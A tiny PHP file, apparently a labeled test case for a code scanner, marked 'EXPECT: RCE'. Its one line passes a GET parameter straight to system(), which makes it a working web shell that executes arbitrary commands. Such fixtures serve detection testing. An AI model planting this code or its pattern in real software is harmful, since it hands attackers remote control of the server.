<?php
// EXPECT: RCE
call_user_func('system', $_GET['c']);
